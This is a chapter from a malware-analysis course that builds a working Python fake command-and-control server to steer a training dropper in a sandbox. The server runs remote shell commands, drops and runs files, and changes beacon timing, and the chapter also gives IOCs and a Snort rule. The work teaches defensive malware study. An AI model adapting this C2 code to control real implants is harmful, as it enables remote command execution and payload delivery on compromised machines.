🔝 Back to [Table of Contents](/TABLE-OF-CONTENTS.md)

# 28.4 — Simulating a C2 Server to Observe Complete Behavior

> 📍 **Objective** — Put into practice everything learned in the previous sections by writing a **complete fake C2 server** in Python. This server will simulate the dropper's command and control infrastructure, allowing us to observe its full behavior: handshake, command execution, file dropping, beacon interval modification, and clean shutdown. This is the culmination of the analysis: taking control of the malware without having its source code.

---

## Why simulate the C2?

Up to this point, our analysis has followed a methodical progression: passive observation with `strace` and Wireshark (28.1), active instrumentation with Frida (28.2), formal protocol reconstruction (28.3). But all these steps shared a common limitation: we never saw the dropper **actually execute its commands** in their entirety.

The mini-C2 from section 28.2 only accepted the connection, acknowledged the handshake, and sent a PING. Yet the dropper has five commands, including two particularly interesting ones (`CMD_EXEC` and `CMD_DROP`) that we haven't been able to trigger in a controlled manner.

Simulating a complete C2 server allows us to:

- **Exercise each command** individually and observe the dropper's exact reaction — response size, encoding, return codes, side effects on the filesystem.  
- **Validate the protocol specification** developed in 28.3. If our understanding is correct, the fake C2 will work on the first try. Any parsing or encoding error will immediately manifest as unexpected behavior.  
- **Discover hidden behaviors** — Some code paths only reveal themselves under specific command sequences or error conditions. An interactive C2 allows exploring these paths.  
- **Produce behavioral IOCs** — By observing the dropper execute its commands in a controlled environment, we precisely document its effects: which files it creates, which processes it launches, which system calls it makes. This information feeds directly into the analysis report (section 27.7).

In the real world, this technique is called **C2 emulation** or **active sinkholing**. It is used by threat intelligence teams to study malware whose C2 infrastructure has been dismantled or is inaccessible.

---

## Fake C2 architecture

Our C2 server will be a single Python script implementing three layers:

```
┌─────────────────────────────────────────────────┐
│           Layer 3: Operator interface           │
│  Interactive console with command menu          │
│  The analyst chooses which command to send      │
├─────────────────────────────────────────────────┤
│           Layer 2: Protocol logic               │
│  Message encoding/decoding                      │
│  XOR, header construction, validation           │
├─────────────────────────────────────────────────┤
│           Layer 1: TCP transport                │
│  Server socket, accept, send_all, recv_all      │
└─────────────────────────────────────────────────┘
```

This layered separation reflects the protocol structure as reconstructed in 28.3, and makes the code extensible if new commands are discovered during analysis.

---

## Layer 1 — TCP transport

The transport layer encapsulates low-level socket operations. It must handle **partial sends and receives** (the kernel doesn't guarantee that `send()` or `recv()` will process the entire buffer in a single call), just as the dropper does on the client side.

```python
#!/usr/bin/env python3
"""
fake_c2.py — Fake C2 server for ELF dropper analysis (Chapter 28)

⚠️  STRICTLY EDUCATIONAL — Run ONLY in the sandboxed VM.
    This script simulates a command and control server to observe
    the dropper's complete behavior without real infrastructure.

Usage:
    Terminal 1:  python3 fake_c2.py
    Terminal 2:  ./dropper_O0        (or via frida -f)
    Terminal 3:  (optional) tcpdump / Wireshark

MIT License — See LICENSE at the repository root.
"""

import socket  
import struct  
import sys  
import os  
import time  
import select  
```

The imports remain minimalist — standard Python library only, no external dependencies. This is a deliberate choice: in a malware analysis context, you want a tool that works immediately in any environment, without additional installation.

### Reliable send and receive

```python
def send_all(sock, data):
    """Send all of `data` on the socket, handling partial sends."""
    total_sent = 0
    while total_sent < len(data):
        sent = sock.send(data[total_sent:])
        if sent == 0:
            raise ConnectionError("Socket connection broken during send")
        total_sent += sent
    return total_sent


def recv_all(sock, length, timeout=30):
    """Receive exactly `length` bytes, handling partial receives.
    
    Raises TimeoutError if no data arrives before `timeout` seconds.
    Raises ConnectionError if the connection is closed before all data is received.
    """
    chunks = []
    received = 0
    while received < length:
        ready, _, _ = select.select([sock], [], [], timeout)
        if not ready:
            raise TimeoutError(
                f"Timeout waiting for data ({received}/{length} bytes received)")
        chunk = sock.recv(length - received)
        if not chunk:
            raise ConnectionError(
                f"Connection closed ({received}/{length} bytes received)")
        chunks.append(chunk)
        received += len(chunk)
    return b"".join(chunks)
```

The **timeout** is important in practice: if the dropper crashes or enters an infinite loop, the C2 shouldn't remain blocked indefinitely on a `recv`. The 30-second timeout is more than sufficient for a beacon whose default interval is 5 seconds.

---

## Layer 2 — Protocol logic

This layer implements the protocol specification reconstructed in section 28.3. Every constant, every structure corresponds exactly to what we observed with `strace`, Wireshark, and Frida.

### Protocol constants

```python
# ─── Protocol ─────────────────────────────────────────────────
PROTO_MAGIC    = 0xDE  
HEADER_SIZE    = 4       # magic(1) + type(1) + length(2)  
MAX_BODY_SIZE  = 4096  
XOR_KEY        = 0x5A  

# Commands: Server → Client
CMD_PING       = 0x01  
CMD_EXEC       = 0x02  
CMD_DROP       = 0x03  
CMD_SLEEP      = 0x04  
CMD_EXIT       = 0x05  

# Messages: Client → Server
MSG_HANDSHAKE  = 0x10  
MSG_PONG       = 0x11  
MSG_RESULT     = 0x12  
MSG_ACK        = 0x13  
MSG_ERROR      = 0x14  
MSG_BEACON     = 0x15  

# Naming tables for display
CMD_NAMES = {
    CMD_PING: "PING", CMD_EXEC: "EXEC", CMD_DROP: "DROP",
    CMD_SLEEP: "SLEEP", CMD_EXIT: "EXIT"
}
MSG_NAMES = {
    MSG_HANDSHAKE: "HANDSHAKE", MSG_PONG: "PONG", MSG_RESULT: "RESULT",
    MSG_ACK: "ACK", MSG_ERROR: "ERROR", MSG_BEACON: "BEACON"
}
ALL_NAMES = {**CMD_NAMES, **MSG_NAMES}
```

> 💡 **RE note** — All these constants were extracted from the binary during the previous sections. The names are those we assigned in Ghidra when renaming symbols. In a real analysis case, this table would be built progressively as protocol understanding develops.

### XOR encoding and decoding

```python
def xor_encode(data, key=XOR_KEY):
    """Apply a single-byte XOR on each byte of the buffer.
    
    The operation is its own inverse: xor_encode(xor_encode(data)) == data.
    Used by the dropper to encode EXEC and DROP commands,
    as well as results (MSG_RESULT).
    """
    return bytes(b ^ key for b in data)
```

The implementation is deliberately identical to the dropper's: a byte-by-byte XOR loop with key `0x5A`. The involution property of XOR (`a ^ k ^ k == a`) means the same function serves for both encoding and decoding.

### Message construction and parsing

```python
def build_message(msg_type, body=b""):
    """Build a complete protocol message (header + body).
    
    Header format (4 bytes, packed):
      - magic  : uint8  = 0xDE
      - type   : uint8  = command/message identifier
      - length : uint16 = body size in little-endian
    """
    if len(body) > MAX_BODY_SIZE:
        raise ValueError(f"Body too large: {len(body)} > {MAX_BODY_SIZE}")
    header = struct.pack("<BBH", PROTO_MAGIC, msg_type, len(body))
    return header + body


def recv_message(sock, timeout=30):
    """Receive and parse a complete protocol message.
    
    Returns a tuple (msg_type, body) or raises an exception.
    Validates the magic byte and length consistency.
    """
    header_raw = recv_all(sock, HEADER_SIZE, timeout)
    magic, msg_type, body_len = struct.unpack("<BBH", header_raw)

    if magic != PROTO_MAGIC:
        raise ValueError(
            f"Invalid magic byte: 0x{magic:02X} (expected 0x{PROTO_MAGIC:02X})")

    if body_len > MAX_BODY_SIZE:
        raise ValueError(f"Body length exceeds maximum: {body_len}")

    body = recv_all(sock, body_len, timeout) if body_len > 0 else b""
    return msg_type, body


def send_command(sock, cmd_type, body=b""):
    """Send a command to the dropper and print a summary."""
    msg = build_message(cmd_type, body)
    send_all(sock, msg)
    name = ALL_NAMES.get(cmd_type, f"0x{cmd_type:02X}")
    print(f"  [>>>] Sent {name} | body={len(body)}B | total={len(msg)}B")
    if body:
        print(f"        body (hex): {body[:64].hex(' ')}"
              + (" ..." if len(body) > 64 else ""))
```

The `"<BBH"` format of `struct.pack` corresponds exactly to the `proto_header_t` layout in the C code: one byte for the magic, one byte for the type, and a 16-bit unsigned integer in little-endian for the length. The `<` prefix forces little-endian interpretation, which matches the native x86-64 behavior (the dropper doesn't perform `htons` conversion on this field).

---

## Layer 3 — Operator interface

The operator interface is the part the analyst uses directly. It offers two modes of operation: an **interactive mode** (terminal menu) and a **script mode** (predefined command sequence).

### Receiving and displaying dropper messages

Before we can send commands, we need to know how to listen. The following function receives a message from the dropper and displays it in a readable format, decoding XOR when appropriate:

```python
def receive_and_display(sock, timeout=30):
    """Receive a message from the dropper, decode it, and display it.
    
    Handles automatic XOR decoding for MSG_RESULT.
    Returns the tuple (msg_type, body_decoded).
    """
    msg_type, body = recv_message(sock, timeout)
    name = ALL_NAMES.get(msg_type, f"0x{msg_type:02X}")

    print(f"  [<<<] Received {name} (0x{msg_type:02X}) | body={len(body)}B")

    if msg_type == MSG_HANDSHAKE:
        # Body = hostname\0 + pid\0 + version\0
        parts = body.split(b"\x00")
        parts = [p.decode("utf-8", errors="replace") for p in parts if p]
        if len(parts) >= 3:
            print(f"        hostname : {parts[0]}")
            print(f"        pid      : {parts[1]}")
            print(f"        version  : {parts[2]}")
        else:
            print(f"        raw parts: {parts}")

    elif msg_type == MSG_RESULT:
        # Body is XOR-encoded — decode to display the result
        decoded = xor_encode(body)  # XOR is its own inverse
        text = decoded.decode("utf-8", errors="replace")
        print(f"        result (decoded): {text[:512]}"
              + (" [...]" if len(text) > 512 else ""))

    elif msg_type == MSG_BEACON:
        # Body = cmd_count(4) + timestamp(4), little-endian
        if len(body) >= 8:
            cmd_count, timestamp = struct.unpack("<II", body[:8])
            t_str = time.strftime("%Y-%m-%d %H:%M:%S",
                                  time.localtime(timestamp))
            print(f"        cmd_count : {cmd_count}")
            print(f"        timestamp : {t_str}")

    elif msg_type == MSG_ACK:
        text = body.decode("utf-8", errors="replace")
        print(f"        ack: {text}")

    elif msg_type == MSG_ERROR:
        text = body.decode("utf-8", errors="replace")
        print(f"        error: {text}")

    elif msg_type == MSG_PONG:
        print(f"        (no body)")

    else:
        if body:
            print(f"        body (hex): {body[:64].hex(' ')}")

    return msg_type, body
```

Each message type is decoded according to its specific structure:

- **HANDSHAKE** — Three concatenated null-terminated strings. We split them and display them by name.  
- **RESULT** — XOR-encoded body. We apply decoding then display as text (it's a shell command's output).  
- **BEACON** — Two 32-bit little-endian integers: command counter and Unix timestamp.  
- **ACK / ERROR** — Plaintext ASCII strings.  
- **PONG** — No body.

### Command sending functions

Each protocol command is encapsulated in a dedicated function that handles the specific encoding and formatting:

```python
def cmd_ping(sock):
    """Send CMD_PING (0x01) and wait for MSG_PONG."""
    print("\n── PING ──")
    send_command(sock, CMD_PING)
    return receive_and_display(sock)


def cmd_exec(sock, command_str):
    """Send CMD_EXEC (0x02) with the shell command XOR-encoded.
    
    The dropper will execute the command via popen() and send
    the output back in an XOR-encoded MSG_RESULT.
    """
    print(f"\n── EXEC: {command_str} ���─")
    encoded = xor_encode(command_str.encode("utf-8"))
    send_command(sock, CMD_EXEC, encoded)
    return receive_and_display(sock)


def cmd_drop(sock, filename, payload_data):
    """Send CMD_DROP (0x03) to drop a file on the target.
    
    Body format (before XOR):
      [filename_len : 1 byte][filename][payload_data]
    
    The dropper will write the file to /tmp/<filename>,
    make it executable (chmod 755), and execute it.
    """
    print(f"\n── DROP: {filename} ({len(payload_data)} bytes) ──")

    fname_bytes = filename.encode("utf-8")
    if len(fname_bytes) > 255:
        print("  [!] Filename too long (max 255 bytes)")
        return None, None

    body = bytes([len(fname_bytes)]) + fname_bytes + payload_data
    encoded = xor_encode(body)
    send_command(sock, CMD_DROP, encoded)
    return receive_and_display(sock)


def cmd_sleep(sock, interval_seconds):
    """Send CMD_SLEEP (0x04) to modify the beacon interval.
    
    The body contains the new interval in seconds,
    encoded in little-endian on 4 bytes (no XOR).
    """
    print(f"\n── SLEEP: {interval_seconds}s ──")
    body = struct.pack("<I", interval_seconds)
    send_command(sock, CMD_SLEEP, body)
    return receive_and_display(sock)


def cmd_exit(sock):
    """Send CMD_EXIT (0x05) to cleanly terminate the dropper."""
    print("\n── EXIT ──")
    send_command(sock, CMD_EXIT)
    return receive_and_display(sock)
```

Each function directly mirrors a dropper handler. The symmetry between the dropper's C code and the C2's Python code is no coincidence — it follows from the protocol specification reconstructed in 28.3. The fake C2 is literally the **mirror** of the dropper.

> 💡 **RE note** — Notice that `CMD_SLEEP` does **not** apply XOR encoding to its body, unlike `CMD_EXEC` and `CMD_DROP`. This asymmetry was observed in 28.2 via Frida hooks on `xor_encode`: the function is only called for commands containing textual data (shell commands, filenames). Numeric values (sleep interval) are transmitted in plaintext. This kind of detail is easy to miss in static analysis alone, but jumps out during dynamic instrumentation.

### Server-side handshake phase

```python
def handle_handshake(sock):
    """Wait for the dropper's handshake and acknowledge it.
    
    This is the mandatory first step of any session.
    The dropper will not accept any commands until the handshake
    has been acknowledged with a MSG_ACK.
    
    Returns the target information (hostname, pid, version).
    """
    print("═" * 60)
    print("  Waiting for handshake...")
    print("═" * 60)

    msg_type, body = receive_and_display(sock)

    if msg_type != MSG_HANDSHAKE:
        print(f"  [!] Expected HANDSHAKE (0x{MSG_HANDSHAKE:02X}), "
              f"got 0x{msg_type:02X}")
        return None

    # Acknowledge the handshake
    ack_body = b"welcome"
    send_command(sock, MSG_ACK, ack_body)
    # Note: we send MSG_ACK (0x13), not a CMD_* command
    # The dropper verifies that the response type is MSG_ACK

    # Parse target information
    parts = body.split(b"\x00")
    parts = [p.decode("utf-8", errors="replace") for p in parts if p]
    info = {
        "hostname": parts[0] if len(parts) > 0 else "?",
        "pid":      parts[1] if len(parts) > 1 else "?",
        "version":  parts[2] if len(parts) > 2 else "?"
    }

    print(f"\n  [+] Target registered: {info['hostname']} "
          f"(PID {info['pid']}, version {info['version']})")
    return info
```

Sending `MSG_ACK` (`0x13`) in response to the handshake is a critical protocol point. If you send something else (for example a `CMD_PING` directly), the dropper interprets it as a rejection and closes the connection. This behavior was identified in 28.1 when the `nc` listener didn't respond and the dropper remained blocked indefinitely on `recv`.

### Handling incoming beacons

Between commands, the dropper sends periodic **beacons** (`MSG_BEACON`, `0x15`). The C2 must consume them to prevent the receive buffer from filling up and blocking communications. Beacon handling naturally interleaves with the command loop:

```python
def drain_beacons(sock, timeout=1):
    """Consume pending beacons without blocking.
    
    Returns the list of received beacons.
    Uses a short timeout to avoid blocking if no
    beacon is pending.
    """
    beacons = []
    while True:
        ready, _, _ = select.select([sock], [], [], timeout)
        if not ready:
            break
        try:
            msg_type, body = recv_message(sock, timeout=2)
            if msg_type == MSG_BEACON:
                if len(body) >= 8:
                    cmd_count, ts = struct.unpack("<II", body[:8])
                    beacons.append({"cmd_count": cmd_count, "timestamp": ts})
                    print(f"  [beacon] cmd_count={cmd_count} "
                          f"ts={time.strftime('%H:%M:%S', time.localtime(ts))}")
            else:
                # Unexpected message — display it
                print(f"  [!] Unexpected message while draining: "
                      f"0x{msg_type:02X}")
        except (TimeoutError, ConnectionError):
            break
    return beacons
```

Using `select()` with a short timeout (1 second) checks whether data is pending without blocking the program. If the dropper has a 5-second beacon interval, we'll never be blocked for more than one second.

---

## Interactive mode — The analyst's console

Interactive mode presents a menu to the analyst and allows sending commands one by one, observing responses, and exploring the dropper's behavior at their own pace.

```python
def interactive_menu(sock, target_info):
    """Interactive loop for sending commands to the dropper."""
    print("\n" + "═" * 60)
    print(f"  C2 Console — Target: {target_info['hostname']} "
          f"(PID {target_info['pid']})")
    print("═" * 60)

    while True:
        # Consume pending beacons
        drain_beacons(sock, timeout=0.5)

        print("\n  Commands:")
        print("    1) PING          — keepalive")
        print("    2) EXEC <cmd>    — execute shell command")
        print("    3) DROP          — drop and execute a file")
        print("    4) SLEEP <sec>   — change beacon interval")
        print("    5) EXIT          — terminate dropper")
        print("    6) WAIT          — wait for next beacon")
        print("    0) QUIT          — close C2 (dropper stays alive)")

        try:
            choice = input("\n  c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  [*] Operator disconnected")
            break

        if not choice:
            continue

        try:
            if choice == "1":
                cmd_ping(sock)

            elif choice.startswith("2"):
                # "2 ls -la /tmp" or just "2" then prompt
                parts = choice.split(None, 1)
                if len(parts) > 1:
                    command_str = parts[1]
                else:
                    command_str = input("  shell> ").strip()
                if command_str:
                    cmd_exec(sock, command_str)

            elif choice == "3":
                fname = input("  filename> ").strip() or "payload.sh"
                print("  Enter payload content (or press Enter for default):")
                user_payload = input("  payload> ").strip()
                if user_payload:
                    payload_data = user_payload.encode("utf-8")
                else:
                    # Default payload: harmless shell script
                    payload_data = (
                        b"#!/bin/sh\n"
                        b"echo '[payload] Hello from dropped file'\n"
                        b"echo '[payload] Hostname:' $(hostname)\n"
                        b"echo '[payload] Date:' $(date)\n"
                        b"echo '[payload] Execution complete'\n"
                    )
                cmd_drop(sock, fname, payload_data)

            elif choice.startswith("4"):
                parts = choice.split(None, 1)
                if len(parts) > 1:
                    interval = int(parts[1])
                else:
                    interval = int(input("  interval (seconds)> ").strip())
                cmd_sleep(sock, interval)

            elif choice == "5":
                cmd_exit(sock)
                print("\n  [*] Dropper terminated. Exiting C2.")
                break

            elif choice == "6":
                print("  [*] Waiting for beacon...")
                receive_and_display(sock, timeout=60)

            elif choice == "0":
                print("  [*] Closing C2 connection (dropper will retry)")
                break

            else:
                print(f"  [?] Unknown command: {choice}")

        except (ConnectionError, BrokenPipeError) as e:
            print(f"\n  [!] Connection lost: {e}")
            break
        except TimeoutError as e:
            print(f"\n  [!] Timeout: {e}")
            print("  [*] The dropper may have crashed or disconnected.")
            break
```

The menu offers a few choices that don't directly correspond to protocol commands:

- **WAIT** (choice 6) — Passively wait for the next beacon. Useful for observing the dropper's idle behavior and verifying the beacon interval.  
- **QUIT** (choice 0) — Close the connection from the C2 side without sending `CMD_EXIT`. The dropper will detect the connection break and attempt to reconnect. This is a good robustness test of the reconnection mechanism.

### Main entry point

```python
def main():
    """Entry point: listen, accept the connection, manage the session."""
    host = "127.0.0.1"
    port = 4444

    print("╔══════════════════════════════════════════════════════╗")
    print("║  Fake C2 Server — Chapter 28 (Educational Only)      ║")
    print("║  ���️  Run ONLY in sandboxed VM                    ║")
    print("╚══════════════════════════════════════════════════════╝")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(1)
        print(f"\n  [*] Listening on {host}:{port}")
        print("  [*] Waiting for dropper connection...\n")

        try:
            conn, addr = srv.accept()
        except KeyboardInterrupt:
            print("\n  [*] Server stopped by operator")
            return

        with conn:
            print(f"  [+] Connection from {addr[0]}:{addr[1]}")

            # Phase 1: Handshake
            target_info = handle_handshake(conn)
            if target_info is None:
                print("  [!] Handshake failed, closing connection")
                return

            # Phase 2: Interactive loop
            interactive_menu(conn, target_info)

    print("\n  [*] C2 server shut down")


if __name__ == "__main__":
    main()
```

---

## Script mode — Automated sequences

Interactive mode is ideal for exploration, but it's slow and non-reproducible. For systematic analyses, you can drive the C2 from a script that chains commands automatically.

The idea is to extract the protocol logic into a reusable module and write scenarios as functions:

```python
def scenario_full_exercise(sock, target_info):
    """Automated scenario that exercises all dropper commands.
    
    This scenario is designed to be run in parallel with Frida
    and/or Wireshark to capture the complete behavior.
    """
    print("\n  [*] Running full exercise scenario...")

    # 1. PING — verify connectivity
    cmd_ping(sock)
    time.sleep(0.5)

    # 2. EXEC — simple command
    cmd_exec(sock, "id")
    time.sleep(0.5)

    # 3. EXEC — command with larger output
    cmd_exec(sock, "ls -la /tmp/")
    time.sleep(0.5)

    # 4. EXEC — command that produces multiline content
    cmd_exec(sock, "cat /etc/hostname")
    time.sleep(0.5)

    # 5. SLEEP — reduce beacon interval to 2 seconds
    cmd_sleep(sock, 2)
    time.sleep(0.5)

    # 6. Wait for a beacon to verify the new interval
    print("\n  [*] Waiting for beacon with new interval...")
    receive_and_display(sock, timeout=10)

    # 7. DROP — drop a harmless shell script
    payload = (
        b"#!/bin/sh\n"
        b"echo 'DROP_TEST: payload executed successfully'\n"
        b"echo 'DROP_TEST: running as' $(whoami)\n"
        b"echo 'DROP_TEST: in directory' $(pwd)\n"
    )
    cmd_drop(sock, "test_payload.sh", payload)
    time.sleep(0.5)

    # 8. EXEC — verify the file was dropped
    cmd_exec(sock, "ls -la /tmp/test_payload.sh")
    time.sleep(0.5)

    # 9. SLEEP — restore default interval
    cmd_sleep(sock, 5)
    time.sleep(0.5)

    # 10. EXIT — clean termination
    cmd_exit(sock)

    print("\n  [+] Scenario complete")
```

This scenario exercises all five commands in a logical order and verifies the side effects (was the file created? is the new interval respected?). Run in parallel with `hook_network.js` (section 28.2) and `tcpdump`, it generates a complete and annotated capture of the entire protocol.

To use this mode, replace the `interactive_menu` call in `main()`:

```python
# In main(), after successful handshake:
# interactive_menu(conn, target_info)      # interactive mode
scenario_full_exercise(conn, target_info)   # script mode
```

---

## Observing complete behavior: combining C2 + Frida + Wireshark

The optimal configuration for exhaustive observation uses **four simultaneous terminals**:

```
┌──────────────────────────────────────────────────────┐
│  Terminal 1:  sudo tcpdump -i lo -w full.pcap        │
│               port 4444                              │
│  → Raw network capture for archiving                 │
├──────────────────────────────────────────────────────┤
│  Terminal 2:  python3 fake_c2.py                     │
│  → Our fake C2 in interactive or script mode         │
├──────────────────────────────────────────────────────┤
│  Terminal 3:  frida -l hook_network.js               │
│               -f ./dropper_O0 --no-pause             │
│  → Frida instrumentation (send/recv/connect hooks)   │
├──────────────────────────────────────────────────────┤
│  Terminal 4:  (observation)                          │
│  tail -f /tmp/test_payload.sh                        │
│  → Verify files dropped by CMD_DROP                  │
└──────────────────────────────────────────────────────┘
```

With this setup, each command sent from the C2 is observable at **four levels**:

1. **fake_c2.py** — Displays the sent command, the received and decoded response.  
2. **Frida** — Shows the raw and decoded `send()` and `recv()` buffers, dropper-side.  
3. **tcpdump/Wireshark** — Captures TCP packets with the protocol's binary payloads.  
4. **Filesystem** — Files dropped in `/tmp/` are visible immediately.

This quadruple cross-observation is the best way to validate protocol understanding: if all four sources agree, the analysis is correct.

---

## Interesting analysis scenarios

Beyond systematically exercising each command, the fake C2 allows exploring **edge cases** that reveal subtle dropper behaviors.

### Testing buffer limits

What happens if you send a `CMD_EXEC` with a 4096-byte body (the maximum size)? And with 4097? Does the dropper check the length before decoding? Is a buffer overflow possible? These questions are directly related to the dropper's own security — and by extension, to the possibility of **turning the malware against its operator**.

```python
# Test: maximum-size command
long_cmd = "A" * 4090  
cmd_exec(sock, long_cmd)  # The dropper will attempt to execute "AAAA...A"  
```

### Sending an invalid command type

The dropper's `dispatch_command` handler contains a `default` case that returns `MSG_ERROR` with body `"unknown_cmd"`. We can verify this:

```python
# Send a nonexistent command type (0xFF)
send_command(sock, 0xFF, b"test")  
msg_type, body = receive_and_display(sock)  
# Expected: MSG_ERROR (0x14) with body "unknown_cmd"
```

### Abruptly closing the connection

If the C2 closes the socket without sending `CMD_EXIT`, the dropper detects the disconnection (via `recv` returning 0 or an error), closes its socket, waits `BEACON_INTERVAL` seconds, and attempts to reconnect. Observing this reconnection cycle is important for understanding the dropper's **resilience** — real malware might have a more sophisticated mechanism (fallback domains, dynamic C2 address generation via DGA).

### Sending commands during a beacon

The dropper uses `select()` with a timeout to alternate between sending beacons and receiving commands. What happens if you send a command **exactly while** the dropper is building a beacon? The `select()` should detect incoming data and prioritize reception. This test validates proper multiplexing behavior.

---

## From analysis to report

The fake C2, combined with Frida and Wireshark captures, provides all the data needed to write a **complete analysis report** (comparable to [Chapter 27, section 27.7](/27-ransomware/07-analysis-report.md)). Here are the elements this phase contributes to the report:

### IOCs (Indicators of Compromise)

| Type | Value | Source |  
|---|---|---|  
| Destination IP | `127.0.0.1` | `strace` connect, Frida hook, pcap |  
| TCP port | `4444` | Same |  
| Magic byte | `0xDE` | Protocol header, pcap |  
| XOR key | `0x5A` | Frida hook on `xor_encode`, static analysis |  
| Version string | `DRP-1.0` | Handshake body, `strings` |  
| Drop directory | `/tmp/` | Frida hook, `strace` open/write |

### Documented behavior

| Capability | Command | Observations |  
|---|---|---|  
| Shell command execution | `CMD_EXEC (0x02)` | Via `popen()`, output sent back XOR-encoded |  
| File dropping | `CMD_DROP (0x03)` | Writes to `/tmp/`, `chmod 755`, `system()` |  
| Connection persistence | `CMD_SLEEP (0x04)` | Adjustable beacon interval (1–3600s) |  
| Clean termination | `CMD_EXIT (0x05)` | Socket close, process termination |  
| Automatic reconnection | (internal behavior) | 3 max attempts, interval = beacon interval |  
| Periodic beacons | `MSG_BEACON (0x15)` | Contains cmd_count and timestamp |

### Network detection rules

The pcap capture produced during this phase allows writing detection rules (Snort, Suricata, Zeek). The magic byte `0xDE` at the first position of each application message is a reliable indicator:

```
alert tcp any any -> any 4444 (msg:"Dropper C2 communication detected";
    content:"|DE|"; offset:0; depth:1;
    metadata:author training,severity high;
    sid:1000001; rev:1;)
```

> 💡 **RE note** — This rule is deliberately simplistic for the educational context. In production, you would refine it with additional criteria (header size, expected type values, connection frequency) to reduce false positives. A single `0xDE` byte at the beginning of a TCP stream is far too broad a criterion for a real network.

---

## Summary: the fake C2 as a validation tool

The `fake_c2.py` script is much more than a simple test tool — it's the **operational proof** that our analysis is complete and correct. If the fake C2 can pilot the dropper through all its functionalities, it means that:

1. The **protocol specification** (section 28.3) is accurate — header format, XOR encoding, message types, state machine.  
2. Every **command handler** has been understood and can be triggered in a controlled manner.  
3. The extracted **IOCs** are sufficient to detect this threat in a real environment.  
4. A **decryptor** or mitigation tool could be written based on this analysis.

The table below summarizes the progression across the entire chapter:

| Section | Approach | What we learn |  
|---|---|---|  
| 28.1 | Passive observation (strace + Wireshark) | IP, port, transport, first message, header structure |  
| 28.2 | Active instrumentation (Frida) | Buffer contents, XOR decoding, internal state machine |  
| 28.3 | Formalization (protocol specification) | Complete format, sequence diagram, command table |  
| 28.4 | Simulation (fake C2) | Exhaustive validation, complete behavior, IOCs, report |

Each section built upon the previous one, and the fake C2 is the culmination that proves the entire analysis chain holds together.

---

> **Up next** — The chapter **checkpoint** will ask you to produce a complete and functional fake C2 capable of piloting the `dropper_O2_strip` variant through all five commands, while capturing the entire session in a pcap file accompanied by a structured analysis report.

⏭️ [🎯 Checkpoint: write a fake C2 server that controls the dropper](/28-dropper/checkpoint.md)
